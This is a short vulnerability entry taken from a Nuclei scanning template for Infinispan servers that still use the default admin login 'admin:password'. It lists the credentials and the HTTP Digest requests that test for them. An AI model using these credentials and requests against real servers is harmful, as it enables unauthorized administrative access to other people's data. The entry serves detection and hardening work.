# Vulnerability: Infinispan - Default Admin Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`infinispan-default-login.yaml`)

## Description
The Infinispan REST API was found exposed with the default administrator credentials `admin:password`. An unauthenticated network attacker can authenticate via HTTP Digest and gain full read/write access to all cache managers, caches, and server administration endpoints.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /rest/v2/cache-managers/default HTTP/1.1
Host: {{Hostname}}
Accept: application/json

GET /rest/v2/cache-managers/default HTTP/1.1
Host: {{Hostname}}
Accept: application/json
Authorization: Digest username="{{username}}", realm="{{realm}}", nonce="{{nonce}}", uri="/rest/v2/cache-managers/default", qop=auth, nc=00000001, cnonce="0a4f113b", response="{{md5(concat(md5(concat(username,":",realm,":",password)),":",nonce,":00000001:0a4f113b:auth:",md5("GET:/rest/v2/cache-managers/default")))}}", algorithm=MD5
```

